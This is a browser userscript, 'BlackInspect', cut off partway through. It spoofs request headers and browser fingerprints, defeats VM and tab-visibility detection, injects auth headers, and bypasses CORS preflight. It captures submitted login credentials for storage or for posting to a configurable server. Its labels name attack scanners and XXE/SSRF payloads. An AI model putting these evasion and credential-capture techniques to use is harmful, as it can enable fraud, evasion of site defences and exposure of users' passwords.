// ==UserScript==
// @name         BlackInspect v7.0
// @namespace    http://tampermonkey.net/
// @version      7.0.0
// @description  Full inspection & spoofing suite — redesigned UI, encrypted password vault, PDF popup, task manager, security scanner, font picker, and more.
// @author       AradPhpProgrammer
// @match        *://*/*
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @grant        GM_download
// @grant        GM_notification
// @require      https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js
// ==/UserScript==

(function () {
  "use strict";

  const D = document,
    W = unsafeWindow,
    N = navigator;
  const BS = "bi_v7_panel";
  let html2canvas = W.html2canvas;
  let pdfjsLib = null;
  let pdfCrackStop = false;

  const dk = (base) => `${base}_${location.hostname}`;
  const S = {
    get ip() {
      return GM_getValue("ip", "");
    },
    set ip(v) {
      GM_setValue("ip", v);
    },
    get ua() {
      return GM_getValue("ua", "");
    },
    set ua(v) {
      GM_setValue("ua", v);
    },
    get platform() {
      return GM_getValue("platform", "");
    },
    set platform(v) {
      GM_setValue("platform", v);
    },
    get language() {
      return GM_getValue("lang", "");
    },
    set language(v) {
      GM_setValue("lang", v);
    },
    get spoofActive() {
      return GM_getValue("spoofActive", false);
    },
    set spoofActive(v) {
      GM_setValue("spoofActive", v);
    },
    get canvasSpoof() {
      return GM_getValue("canvasSpoof", false);
    },
    set canvasSpoof(v) {
      GM_setValue("canvasSpoof", v);
    },
    get breakOnStart() {
      return GM_getValue(dk("bos"), false);
    },
    set breakOnStart(v) {
      GM_setValue(dk("bos"), v);
    },
    get passwords() {
      try {
        return JSON.parse(GM_getValue("passwords", "[]"));
      } catch (e) {
        return [];
      }
    },
    set passwords(v) {
      GM_setValue("passwords", JSON.stringify(v));
    },
    get todos() {
      try {
        return JSON.parse(GM_getValue("todos", "[]"));
      } catch (e) {
        return [];
      }
    },
    set todos(v) {
      GM_setValue("todos", JSON.stringify(v));
    },
    get panelLeft() {
      return GM_getValue("panelLeft", 10);
    },
    set panelLeft(v) {
      GM_setValue("panelLeft", v);
    },
    get panelTop() {
      return GM_getValue("panelTop", 10);
    },
    set panelTop(v) {
      GM_setValue("panelTop", v);
    },
    get panelWidth() {
      return GM_getValue("panelWidth", Math.min(W.innerWidth - 20, 940));
    },
    set panelWidth(v) {
      GM_setValue("panelWidth", v);
    },
    get panelHeight() {
      return GM_getValue("panelHeight", Math.min(W.innerHeight - 20, 580));
    },
    set panelHeight(v) {
      GM_setValue("panelHeight", v);
    },
    get activeTab() {
      return GM_getValue("activeTab", "Info");
    },
    set activeTab(v) {
      GM_setValue("activeTab", v);
    },
    get uiLang() {
      return GM_getValue("langUI", "en");
    },
    set uiLang(v) {
      GM_setValue("langUI", v);
    },
    get kernelUrl() {
      return GM_getValue("kernelUrl", "http://localhost:5000");
    },
    set kernelUrl(v) {
      GM_setValue("kernelUrl", v);
    },
    get panelOpacity() {
      return parseFloat(GM_getValue("opacity", "1"));
    },
    set panelOpacity(v) {
      GM_setValue("opacity", String(v));
    },
    get fontSize() {
      return parseInt(GM_getValue("fontSize", "13"));
    },
    set fontSize(v) {
      GM_setValue("fontSize", String(v));
    },
    get fontFamily() {
      return GM_getValue("fontFamily", "IBM Plex Mono");
    },
    set fontFamily(v) {
      GM_setValue("fontFamily", v);
    },
    get tabVisSpoof() {
      return GM_getValue("tabVisSpoof", false);
    },
    set tabVisSpoof(v) {
      GM_setValue("tabVisSpoof", v);
    },
    get antiVM() {
      return GM_getValue("antiVM", false);
    },
    set antiVM(v) {
      GM_setValue("antiVM", v);
    },
    get hideExt() {
      return GM_getValue("hideExt", false);
    },
    set hideExt(v) {
      GM_setValue("hideExt", v);
    },
    get spoofBuildID() {
      return GM_getValue("spoofBuildID", false);
    },
    set spoofBuildID(v) {
      GM_setValue("spoofBuildID", v);
    },
    get authActive() {
      return GM_getValue("authActive", false);
    },
    set authActive(v) {
      GM_setValue("authActive", v);
    },
    get authHName() {
      return GM_getValue("authHName", "Authorization");
    },
    set authHName(v) {
      GM_setValue("authHName", v);
    },
    get authHVal() {
      return GM_getValue("authHVal", "");
    },
    set authHVal(v) {
      GM_setValue("authHVal", v);
    },
    get preventPre() {
      return GM_getValue("preventPre", false);
    },
    set preventPre(v) {
      GM_setValue("preventPre", v);
    },
    get customCtx() {
      return GM_getValue("customCtx", false);
    },
    set customCtx(v) {
      GM_setValue("customCtx", v);
    },
    get fillProfile() {
      try {
        return JSON.parse(GM_getValue("fillProfile", "{}"));
      } catch (e) {
        return {};
      }
    },
    set fillProfile(v) {
      GM_setValue("fillProfile", JSON.stringify(v));
    },
    get passFile() {
      return GM_getValue("passFile", "passwords.json");
    },
    set passFile(v) {
      GM_setValue("passFile", v);
    },
    get profileFile() {
      return GM_getValue("profileFile", "bi_profile.json");
    },
    set profileFile(v) {
      GM_setValue("profileFile", v);
    },
    get breakOptions() {
      try {
        return JSON.parse(
          GM_getValue(
            dk("brkOpts"),
            '{"contextmenu":true,"copy":true,"paste":true,"selectstart":true,"dragstart":true,"mousedown":true}',
          ),
        );
      } catch (e) {
        return {
          contextmenu: true,
          copy: true,
          paste: true,
          selectstart: true,
          dragstart: true,
          mousedown: true,
        };
      }
    },
    set breakOptions(v) {
      GM_setValue(dk("brkOpts"), JSON.stringify(v));
    },
    get kernelOnline() {
      return GM_getValue("kernelOnline", false);
    },
    set kernelOnline(v) {
      GM_setValue("kernelOnline", v);
    },
  };

  const TRANS = {
    Info: { en: "Info", fa: "اطلاعات" },
    Vars: { en: "Vars", fa: "متغیرها" },
    Inject: { en: "Inject", fa: "تزریق" },
    Spoof: { en: "Spoof", fa: "جعل" },
    Pass: { en: "Pass", fa: "رمزها" },
    Storage: { en: "Storage", fa: "ذخیره‌سازی" },
    Tools: { en: "Tools", fa: "ابزارها" },
    DOM: { en: "DOM", fa: "DOM" },
    Network: { en: "Network", fa: "شبکه" },
    Security: { en: "Security", fa: "امنیت" },
    PDF: { en: "PDF", fa: "PDF" },
    Tasks: { en: "Tasks", fa: "وظایف" },
    Settings: { en: "Settings", fa: "تنظیمات" },
    "Filter...": { en: "Filter...", fa: "فیلتر..." },
    Save: { en: "Save", fa: "ذخیره" },
    Delete: { en: "Delete", fa: "حذف" },
    Edit: { en: "Edit", fa: "ویرایش" },
    Cancel: { en: "Cancel", fa: "انصراف" },
    Add: { en: "Add", fa: "افزودن" },
    Export: { en: "Export", fa: "خروجی" },
    Import: { en: "Import", fa: "وارد کردن" },
    Generate: { en: "Generate", fa: "تولید" },
    Scan: { en: "Scan", fa: "اسکن" },
    Stop: { en: "Stop", fa: "توقف" },
    Start: { en: "Start", fa: "شروع" },
    Apply: { en: "Apply", fa: "اعمال" },
    Reset: { en: "Reset", fa: "بازنشانی" },
    Copy: { en: "Copy", fa: "کپی" },
    Open: { en: "Open", fa: "باز کردن" },
    Close: { en: "Close", fa: "بستن" },
    "Loading...": { en: "Loading...", fa: "در حال بارگذاری..." },
    Error: { en: "Error", fa: "خطا" },
    "No data": { en: "No data", fa: "داده‌ای نیست" },
    "Start Spoofing": { en: "Start Spoofing", fa: "شروع جعل" },
    "Stop Spoofing": { en: "Stop Spoofing", fa: "توقف جعل" },
    "Spoofing active": { en: "Spoofing active", fa: "جعل فعال است" },
    "Fake IP": { en: "Fake IP (X-Forwarded-For)", fa: "IP جعلی" },
    "User-Agent": { en: "User-Agent", fa: "User-Agent" },
    Platform: { en: "Platform", fa: "سیستم‌عامل" },
    Language: { en: "Language", fa: "زبان" },
    "Break on load": {
      en: "Break on load",
      fa: "شکستن محدودیت‌ها هنگام بارگذاری",
    },
    "Canvas Spoof": {
      en: "Canvas Fingerprint Spoof",
      fa: "جعل اثر انگشت Canvas",
    },
    "Tab Visibility": { en: "Tab Visibility Spoof", fa: "جعل نمایان بودن تب" },
    "Anti-VM": { en: "Anti-VM Detection", fa: "جلوگیری از تشخیص VM" },
    "Hide Extensions": {
      en: "Hide Browser Extensions",
      fa: "مخفی‌سازی افزونه‌ها",
    },
    "Spoof BuildID": {
      en: "Spoof Firefox BuildID",
      fa: "جعل BuildID فایرفاکس",
    },
    "Password Generator": { en: "Password Generator", fa: "تولید رمز عبور" },
    Length: { en: "Length", fa: "طول" },
    Numbers: { en: "Numbers", fa: "اعداد" },
    Uppercase: { en: "Uppercase", fa: "حروف بزرگ" },
    Lowercase: { en: "Lowercase", fa: "حروف کوچک" },
    Letters: { en: "Letters", fa: "حروف" },
    "Special Chars": { en: "Special Chars", fa: "کاراکترهای خاص" },
    "Generated password": { en: "Generated password", fa: "رمز تولیدشده" },
    "Use Password": { en: "Use Password", fa: "استفاده از رمز" },
    "Saved Passwords": { en: "Saved Passwords", fa: "رمزهای ذخیره‌شده" },
    Username: { en: "Username / Email", fa: "نام کاربری / ایمیل" },
    "No passwords saved": {
      en: "No passwords saved yet.",
      fa: "هنوز رمزی ذخیره نشده.",
    },
    "Password saved": { en: "Password saved!", fa: "رمز ذخیره شد!" },
    "Save password?": { en: "Save password?", fa: "رمز ذخیره شود؟" },
    "Yes, Save": { en: "Yes, Save", fa: "بله، ذخیره کن" },
    "Load PDF": { en: "Load PDF File", fa: "بارگذاری فایل PDF" },
    "PDF URL": { en: "PDF URL", fa: "آدرس PDF" },
    "PDF Password": { en: "PDF Password (optional)", fa: "رمز PDF (اختیاری)" },
    "Crack Password": { en: "Crack Password", fa: "شکستن رمز PDF" },
    "Common Passwords": { en: "Common Passwords", fa: "رمزهای رایج" },
    "Custom Wordlist": { en: "Custom Wordlist", fa: "لیست کلمات دلخواه" },
    "Digit Range": { en: "Digit Range", fa: "محدوده عددی" },
    "Found! Password": { en: "Found! Password", fa: "یافت شد! رمز" },
    "Not found": { en: "Not found in list.", fa: "در لیست پیدا نشد." },
    Trying: { en: "Trying", fa: "در حال امتحان" },
    "Add Task": { en: "Add Task", fa: "وظیفه جدید" },
    "Add Note": { en: "Add Note", fa: "یادداشت جدید" },
    "Task desc": { en: "Description...", fa: "توضیحات..." },
    "Due date": { en: "Due date", fa: "موعد مقرر" },
    "Notify in mins": { en: "Notify in (minutes)", fa: "اعلان بعد از (دقیقه)" },
    Priority: { en: "Priority", fa: "اولویت" },
    Low: { en: "Low", fa: "پایین" },
    Medium: { en: "Medium", fa: "متوسط" },
    High: { en: "High", fa: "بالا" },
    "No priority": { en: "No priority", fa: "بدون اولویت" },
    "No tasks": {
      en: "No tasks yet — add one above!",
      fa: "هنوز وظیفه‌ای ثبت نشده!",
    },
    "No notes": {
      en: "No notes yet — write one above!",
      fa: "هنوز یادداشتی نیست!",
    },
    "Show done": { en: "Show completed", fa: "نمایش انجام‌شده‌ها" },
    "Clear done": { en: "Clear completed", fa: "حذف انجام‌شده‌ها" },
    "Delete all": { en: "Delete all", fa: "حذف همه" },
    "Search tasks": { en: "Search tasks...", fa: "جستجو در وظایف..." },
    "Search notes": { en: "Search notes...", fa: "جستجو در یادداشت‌ها..." },
    "Sort by": { en: "Sort by", fa: "مرتب‌سازی بر اساس" },
    Created: { en: "Created", fa: "تاریخ ساخت" },
    Due: { en: "Due date", fa: "موعد مقرر" },
    Title: { en: "Title", fa: "عنوان" },
    "XSS Scanner": { en: "XSS Scanner", fa: "اسکنر XSS" },
    "SQLi Scanner": { en: "SQLi Scanner", fa: "اسکنر SQLi" },
    Clickjacking: { en: "Clickjacking Check", fa: "بررسی Clickjacking" },
    "HTML Injection": { en: "HTML Injection", fa: "تزریق HTML" },
    "XXE Payloads": { en: "XXE Payloads", fa: "بارهای XXE" },
    "SSRF Payloads": { en: "SSRF Payloads", fa: "بارهای SSRF" },
    "Subdomain Takeover": { en: "Subdomain Takeover", fa: "تصاحب زیردامنه" },
    "Directory BF": { en: "Directory BruteForce", fa: "جستجوی مسیر" },
    "XSS Inject": { en: "XSS Inject (Debug)", fa: "تزریق XSS (دیباگ)" },
    Vulnerable: { en: "⚠ VULNERABLE", fa: "⚠ آسیب‌پذیر" },
    Protected: { en: "✅ PROTECTED", fa: "✅ محافظت شده" },
    "No params": { en: "No URL params found.", fa: "پارامتر URL یافت نشد." },
    "Auth Injection": {
      en: "Auth Header Injection",
      fa: "تزریق هدر احراز هویت",
    },
    "Prevent Preflight": {
      en: "Prevent Preflight",
      fa: "جلوگیری از Preflight",
    },
    "SSL Headers": { en: "SSL/TLS Security Headers", fa: "هدرهای امنیتی SSL" },
    "Header Name": { en: "Header Name", fa: "نام هدر" },
    "Token Value": { en: "Token / Value", fa: "توکن / مقدار" },
    Cookies: { en: "Cookies", fa: "کوکی‌ها" },
    LocalStorage: { en: "LocalStorage", fa: "LocalStorage" },
    SessionStorage: { en: "SessionStorage", fa: "SessionStorage" },
    "Set Cookie": { en: "Set Cookie", fa: "تنظیم کوکی" },
    "No cookies": { en: "No cookies", fa: "کوکی‌ای وجود ندارد" },
    "Break Restrictions": { en: "Break Restrictions", fa: "شکستن محدودیت‌ها" },
    "Restore Restrictions": {
      en: "Restore Restrictions",
      fa: "بازگرداندن محدودیت‌ها",
    },
    "Download Page": { en: "Download Full Page", fa: "دانلود کامل صفحه" },
    "Copy Text": { en: "Copy All Text", fa: "کپی همه متن" },
    Screenshot: { en: "Full Page Screenshot", fa: "عکس کامل صفحه" },
    "Show Passwords": { en: "Reveal Password Fields", fa: "نمایش فیلدهای رمز" },
    "Split AI": { en: "Split View with AI", fa: "نمای دوگانه با هوش مصنوعی" },
    "UI Language": { en: "UI Language", fa: "زبان رابط" },
    "Font Size": { en: "Font Size", fa: "اندازه فونت" },
    "Font Family": { en: "Font Family", fa: "فونت" },
    "Panel Opacity": { en: "Panel Opacity", fa: "شفافیت پنل" },
    "Kernel URL": { en: "Kernel URL", fa: "آدرس Kernel" },
    "Test Kernel": { en: "Test Kernel", fa: "تست Kernel" },
    "Kernel online": { en: "✅ Kernel is online!", fa: "✅ Kernel فعال است!" },
    "Kernel offline": {
      en: "❌ Kernel offline — passwords stored locally.",
      fa: "❌ Kernel آفلاین — رمزها به‌صورت محلی ذخیره می‌شوند.",
    },
    "Custom Right-Click": {
      en: "Custom Right-Click Menu",
      fa: "منوی کلیک راست سفارشی",
    },
    "Reset Position": {
      en: "Reset Panel Position (Ctrl+Z)",
      fa: "بازنشانی موقعیت پنل (Ctrl+Z)",
    },
    "Form Profile": { en: "Form Auto-Fill Profile", fa: "پروفایل پرکردن فرم" },
    "Full Name": { en: "Full Name", fa: "نام کامل" },
    Email: { en: "Email", fa: "ایمیل" },
    Phone: { en: "Phone", fa: "تلفن" },
    Address: { en: "Address", fa: "آدرس" },
    Birthday: { en: "Birthday", fa: "تاریخ تولد" },
    "Save Profile": { en: "Save Profile", fa: "ذخیره پروفایل" },
    "Fill Forms": { en: "Fill Page Forms", fa: "پر کردن فرم‌های صفحه" },
    "Profile saved": { en: "Profile saved.", fa: "پروفایل ذخیره شد." },
  };

  const T = (key) => {
    const e = TRANS[key];
    if (!e) return key;
    return e[S.uiLang] || e["en"] || key;
  };

  const FONTS = [
    {
      name: "IBM Plex Mono",
      url: "https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&display=swap",
    },
    {
      name: "Vazirmatn",
      url: "https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css",
    },
    {
      name: "Fira Code",
      url: "https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap",
    },
    {
      name: "JetBrains Mono",
      url: "https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap",
    },
    {
      name: "Space Mono",
      url: "https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap",
    },
    {
      name: "Courier Prime",
      url: "https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap",
    },
  ];

  function loadFont(fontName) {
    const f = FONTS.find((x) => x.name === fontName);
    if (!f) return;
    const id = "bi-font-" + fontName.replace(/\s/g, "_");
    if (!D.getElementById(id)) {
      const lnk = D.createElement("link");
      lnk.id = id;
      lnk.rel = "stylesheet";
      lnk.href = f.url;
      D.head.appendChild(lnk);
    }
  }

  function applyFont() {
    loadFont(S.fontFamily);
    const st = D.getElementById("bi-font-style");
    if (st)
      st.textContent = `#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`;
  }

  let panel = null;
  let restrictionsBroken = false;
  let dirScanStop = false;
  let saveDirectoryHandle = null;
  let fpsRafId = null,
    fpsCount = 0,
    fpsLastTime = performance.now(),
    currentFps = 0;

  (function earlyApply() {
    if (S.spoofActive) applySpoofing(S.ip, S.ua, S.platform, S.language);
    if (S.canvasSpoof) applyCanvasSpoof();
    if (S.tabVisSpoof) applyTabVisSpoof();
    if (S.hideExt) applyHideExt();
    if (S.spoofBuildID) applyBuildIDSpoof();
    if (S.antiVM) applyAntiVM();
    if (S.authActive) applyAuthInjection();
    if (S.preventPre) applyPreflightPrevention();
    if (S.breakOnStart) {
      breakRestrictions(S.breakOptions);
      restrictionsBroken = true;
    }
    FONTS.forEach((f) => loadFont(f.name));
    startFPS();
    checkKernelSilent();
  })();

  function applySpoofing(ip, ua, plat, lang) {
    const origFetch = W.fetch,
      origXHR = W.XMLHttpRequest;
    W.fetch = function (...args) {
      let [resource, options = {}] = args;
      const headers = new Headers(
        options.headers ||
          (resource instanceof Request ? resource.headers : {}),
      );
      if (ip) headers.set("X-Forwarded-For", ip);
      if (ua) headers.set("User-Agent", ua);
      if (resource instanceof Request)
        resource = new Request(resource, { ...options, headers });
      else options = { ...options, headers };
      return origFetch.call(this, resource, options);
    };
    W.XMLHttpRequest = class extends origXHR {
      open(...a) {
        this._bi_open = true;
        return super.open(...a);
      }
      send(...a) {
        if (this._bi_open) {
          if (ip) this.setRequestHeader("X-Forwarded-For", ip);
          if (ua) this.setRequestHeader("User-Agent", ua);
        }
        return super.send(...a);
      }
    };
    if (ua)
      try {
        Object.defineProperty(N, "userAgent", {
          get: () => ua,
          configurable: true,
        });
      } catch (e) {}
    if (plat)
      try {
        Object.defineProperty(N, "platform", {
          get: () => plat,
          configurable: true,
        });
      } catch (e) {}
    if (lang)
      try {
        Object.defineProperty(N, "language", {
          get: () => lang,
          configurable: true,
        });
      } catch (e) {}
  }

  function applyCanvasSpoof() {
    try {
      const orig = HTMLCanvasElement.prototype.getContext;
      HTMLCanvasElement.prototype.getContext = function () {
        const ctx = orig.apply(this, arguments);
        if (ctx && arguments[0] === "2d") {
          const origGID = ctx.getImageData.bind(ctx);
          ctx.getImageData = function (x, y, w, h) {
            const d = origGID(x, y, w, h);
            const n = new Uint8Array(d.data.length);
            crypto.getRandomValues(n);
            for (let i = 0; i < d.data.length; i += 4) {
              d.data[i] = Math.max(
                0,
                Math.min(255, d.data[i] + ((n[i] % 3) - 1)),
              );
              d.data[i + 1] = Math.max(
                0,
                Math.min(255, d.data[i + 1] + ((n[i + 1] % 3) - 1)),
              );
              d.data[i + 2] = Math.max(
                0,
                Math.min(255, d.data[i + 2] + ((n[i + 2] % 3) - 1)),
              );
            }
            return d;
          };
        }
        return ctx;
      };
    } catch (e) {}
  }

  function applyTabVisSpoof() {
    try {
      Object.defineProperty(D, "hidden", {
        get: () => false,
        configurable: true,
      });
      Object.defineProperty(D, "visibilityState", {
        get: () => "visible",
        configurable: true,
      });
      D.addEventListener(
        "visibilitychange",
        (e) => {
          e.stopImmediatePropagation();
        },
        true,
      );
      W.addEventListener(
        "blur",
        (e) => {
          e.stopImmediatePropagation();
        },
        true,
      );
    } catch (e) {}
  }

  function applyHideExt() {
    try {
      const fp = [];
      Object.defineProperty(fp, "item", { value: () => null });
      Object.defineProperty(fp, "namedItem", { value: () => null });
      Object.defineProperty(fp, "refresh", { value: () => {} });
      Object.defineProperty(N, "plugins", {
        get: () => fp,
        configurable: true,
      });
      Object.defineProperty(N, "mimeTypes", {
        get: () => [],
        configurable: true,
      });
    } catch (e) {}
  }

  function applyBuildIDSpoof() {
    try {
      if ("buildID" in N)
        Object.defineProperty(N, "buildID", {
          get: () => "20181001000000",
          configurable: true,
        });
    } catch (e) {}
  }

  function applyAntiVM() {
    try {
      Object.defineProperty(N, "hardwareConcurrency", {
        get: () => 8,
        configurable: true,
      });
      Object.defineProperty(N, "deviceMemory", {
        get: () => 8,
        configurable: true,
      });
      Object.defineProperty(screen, "width", {
        get: () => 1920,
        configurable: true,
      });
      Object.defineProperty(screen, "height", {
        get: () => 1080,
        configurable: true,
      });
      Object.defineProperty(screen, "availWidth", {
        get: () => 1920,
        configurable: true,
      });
      Object.defineProperty(screen, "availHeight", {
        get: () => 1040,
        configurable: true,
      });
      Object.defineProperty(screen, "colorDepth", {
        get: () => 24,
        configurable: true,
      });
      const origGP = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function (p) {
        if (p === 37445) return "Intel Inc.";
        if (p === 37446) return "Intel Iris OpenGL Engine";
        return origGP.call(this, p);
      };
    } catch (e) {}
  }

  function applyAuthInjection() {
    if (!S.authActive || !S.authHVal) return;
    const hn = S.authHName || "Authorization",
      hv = S.authHVal;
    const oF = W.fetch;
    W.fetch = function (...args) {
      let [r, o = {}] = args;
      const h = new Headers(
        o.headers || (r instanceof Request ? r.headers : {}),
      );
      h.set(hn, hv);
      if (r instanceof Request) r = new Request(r, { ...o, headers: h });
      else o = { ...o, headers: h };
      return oF.call(this, r, o);
    };
    const OX = W.XMLHttpRequest;
    W.XMLHttpRequest = class extends OX {
      open(...a) {
        this._bio = true;
        return super.open(...a);
      }
      send(...a) {
        if (this._bio) this.setRequestHeader(hn, hv);
        return super.send(...a);
      }
    };
  }

  function applyPreflightPrevention() {
    if (!S.preventPre) return;
    const oF = W.fetch;
    W.fetch = function (r, o = {}) {
      const h = new Headers(o.headers || {});
      const ct = h.get("content-type") || "";
      if (
        ![
          "application/x-www-form-urlencoded",
          "multipart/form-data",
          "text/plain",
        ].some((t) => ct.startsWith(t))
      )
        h.set("content-type", "text/plain");
      for (const k of [...h.keys()])
        if (
          ![
            "accept",
            "accept-language",
            "content-language",
            "content-type",
          ].includes(k.toLowerCase())
        )
          h.delete(k);
      return oF.call(this, r, { ...o, headers: h });
    };
  }

  function breakRestrictions(opts) {
    const o = opts || S.breakOptions;
    if (o.contextmenu) {
      D.oncontextmenu = null;
      if (D.body) D.body.oncontextmenu = null;
      W.oncontextmenu = null;
    }
    if (o.selectstart || o.copy) {
      const s = D.createElement("style");
      s.id = "bi-break-style";
      if (o.selectstart)
        s.textContent +=
          "*,*::before,*::after{user-select:auto!important;-webkit-user-select:auto!important;pointer-events:auto!important}";
      if (!D.getElementById("bi-break-style")) D.head && D.head.appendChild(s);
      D.querySelectorAll('[style*="pointer-events:none"]').forEach(
        (el) => (el.style.pointerEvents = "auto"),
      );
    }
    [
      "copy",
      "cut",
      "paste",
      "selectstart",
      "contextmenu",
      "dragstart",
      "mousedown",
    ].forEach((ev) => {
      if (o[ev]) {
        D.addEventListener(
          ev,
          (e) => {
            e.stopImmediatePropagation();
            e.stopPropagation();
            Object.defineProperty(e, "preventDefault", { value: () => {} });
          },
          true,
        );
        W.addEventListener(
          ev,
          (e) => {
            e.stopImmediatePropagation();
            e.stopPropagation();
            Object.defineProperty(e, "preventDefault", { value: () => {} });
          },
          true,
        );
      }
    });
    if (o.copy) {
      D.addEventListener(
        "copy",
        (e) => {
          e.stopImmediatePropagation();
          const sel = getSelection().toString();
          if (sel && e.clipboardData) {
            e.clipboardData.setData("text/plain", sel);
            e.preventDefault();
          }
        },
        true,
      );
    }
    D.querySelectorAll(
      "[oncopy],[oncut],[onpaste],[oncontextmenu],[onselectstart]",
    ).forEach((el) => {
      el.oncopy =
        el.oncut =
        el.onpaste =
        el.oncontextmenu =
        el.onselectstart =
          null;
    });
  }

  function startFPS() {
    fpsCount = 0;
    fpsLastTime = performance.now();
    function frame() {
      fpsCount++;
      const now = performance.now();
      if (now - fpsLastTime >= 1000) {
        currentFps = fpsCount;
        fpsCount = 0;
        fpsLastTime = now;
        const hud = D.getElementById("bi-fps-hud");
        if (hud) hud.textContent = currentFps + " fps";
      }
      fpsRafId = requestAnimationFrame(frame);
    }
    if (fpsRafId) cancelAnimationFrame(fpsRafId);
    fpsRafId = requestAnimationFrame(frame);
  }

  async function kernelFetch(path, opts = {}) {
    const url = S.kernelUrl + path;
    return fetch(url, {
      headers: { "Content-Type": "application/json", ...(opts.headers || {}) },
      ...opts,
    });
  }

  async function checkKernelSilent() {
    try {
      const r = await kernelFetch("/health");
      S.kernelOnline = r.ok;
    } catch (e) {
      S.kernelOnline = false;
    }
  }

  async function savePasswordKernel(entry) {
    if (S.kernelOnline) {
      try {
        await kernelFetch("/passwords/save", {
          method: "POST",
          body: JSON.stringify(entry),
        });
        return true;
      } catch (e) {}
    }

    const arr = S.passwords;
    arr.push({ ...entry, saved_at: new Date().toISOString() });
    S.passwords = arr;
    return false;
  }

  async function loadPasswordsKernel() {
    if (S.kernelOnline) {
      try {
        const r = await kernelFetch("/passwords/list");
        if (r.ok) {
          const d = await r.json();
          return d.passwords || [];
        }
      } catch (e) {}
    }
    return S.passwords;
  }

  (function detectLogin() {
    D.addEventListener(
      "submit",
      async (e) => {
        const form = e.target;
        if (!form) return;
        const passField = form.querySelector("input[type=password]");
        if (!passField) return;
        const userField = form.querySelector(
          "input[type=email],input[type=text],[name*=user],[name*=email],[id*=user],[id*=email]",
        );
        const pass = passField.value;
        const user = userField ? userField.value : "";
        if (!pass) return;

        const notify = D.createElement("div");
        notify.id = "bi-save-prompt";
        notify.style.cssText = `
            position:fixed;bottom:80px;right:20px;z-index:2147483647;
            background:#161b22;border:1px solid #3fb950;border-radius:12px;
            padding:16px 20px;color:#c9d1d9;font-family:'IBM Plex Mono',monospace;
            font-size:13px;box-shadow:0 8px 32px rgba(0,0,0,0.7);
            display:flex;flex-direction:column;gap:10px;min-width:280px;
            animation:bi-slideup 0.3s ease;
        `;
        const style = D.createElement("style");
        style.textContent = `@keyframes bi-slideup{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}`;
        D.head.appendChild(style);
        notify.innerHTML = `
            <div style="display:flex;align-items:center;gap:8px;">
                <span style="font-size:20px;">🔐</span>
                <span style="color:#3fb950;font-weight:600;">${T("save password?")}</span>
            </div>
            <div style="color:#8b949e;font-size:12px;">${location.hostname} · ${user || "unknown user"}</div>
            <div style="display:flex;gap:8px;">
                <button id="bi-savepw-yes" style="flex:1;background:#3fb950;color:#0d1117;border:none;border-radius:6px;padding:7px 14px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;">${T("Yes, Save")}</button>
                <button id="bi-savepw-no"  style="flex:1;background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:7px 14px;cursor:pointer;font-family:inherit;font-size:12px;">No</button>
            </div>`;
        D.body.appendChild(notify);

        D.getElementById("bi-savepw-yes").onclick = async () => {
          await savePasswordKernel({
            domain: location.hostname,
            username: user,
            password: pass,
            url: location.href,
          });
          notify.remove();
        };
        D.getElementById("bi-savepw-no").onclick = () => notify.remove();
        setTimeout(() => {
          if (D.getElementById("bi-save-prompt")) notify.remove();
        }, 12000);
      },
      true,
    );
  })();

  setInterval(() => {
    const todos = S.todos;
    let changed = false;
    todos.forEach((t, i) => {
      if (t.time && !t.notified && Date.now() >= t.time) {
        if ("Notification" in W && Notification.permission === "granted")
          new Notification("⚙ BlackInspect", { body: t.text });
        todos[i].notified = true;
        changed = true;
      }
    });
    if (changed) S.todos = todos;
  }, 15000);

  D.addEventListener(
    "contextmenu",
    (e) => {
      if (!S.customCtx) return;
      if (e.target.closest("#" + BS) || e.target.closest("#bi-ctxmenu")) return;
      e.preventDefault();
      showCtxMenu(e.clientX, e.clientY, e.target);
    },
    true,
  );

  function showCtxMenu(x, y, target) {
    D.getElementById("bi-ctxmenu")?.remove();
    const menu = D.createElement("div");
    menu.id = "bi-ctxmenu";
    menu.style.cssText = `
        position:fixed;top:${Math.min(y, W.innerHeight - 280)}px;left:${Math.min(x, W.innerWidth - 200)}px;
        background:#161b22;border:1px solid #30363d;border-radius:10px;
        z-index:2147483647;min-width:190px;
        box-shadow:0 8px 32px rgba(0,0,0,0.8);
        font-family:'IBM Plex Mono',Consolas,monospace;font-size:12px;color:#c9d1d9;
        padding:4px 0;direction:ltr;
    `;
    const items = [
      { i: "📋", t: "Copy", a: () => D.execCommand("copy") },
      { i: "✂️", t: "Cut", a: () => D.execCommand("cut") },
      { i: "📌", t: "Paste", a: () => D.execCommand("paste") },
      null,
      {
        i: "🔍",
        t: "Inspect Element",
        a: () => console.log("[BlackInspect]", target),
      },
      {
        i: "📝",
        t: "Copy outerHTML",
        a: () => N.clipboard?.writeText(target.outerHTML),
      },
      {
        i: "🔗",
        t: "Copy link URL",
        a: () => {
          const a = target.closest("a");
          if (a) N.clipboard?.writeText(a.href);
        },
      },
      {
        i: "🖼",
        t: "Copy image src",
        a: () => {
          const img =
            target.tagName === "IMG" ? target : target.querySelector("img");
          if (img) N.clipboard?.writeText(img.src);
        },
      },
      {
        i: "🔎",
        t: "View page source",
        a: () => window.open("view-source:" + location.href),
      },
      null,
      {
        i: "⚙",
        t: "Open BlackInspect",
        a: () => {
          if (panel) panel.style.display = "flex";
          else createPanel();
        },
      },
      {
        i: "🔓",
        t: "Break Restrictions",
        a: () => {
          breakRestrictions();
          restrictionsBroken = true;
        },
      },
      { i: "📸", t: "Quick Screenshot", a: () => takeScreenshot() },
    ];
    items.forEach((item) => {
      if (!item) {
        const s = D.createElement("div");
        s.style.cssText = "border-top:1px solid #21262d;margin:3px 0;";
        menu.appendChild(s);
        return;
      }
      const el = D.createElement("div");
      el.style.cssText =
        "padding:7px 14px;cursor:pointer;display:flex;align-items:center;gap:8px;border-radius:0;transition:background .1s;";
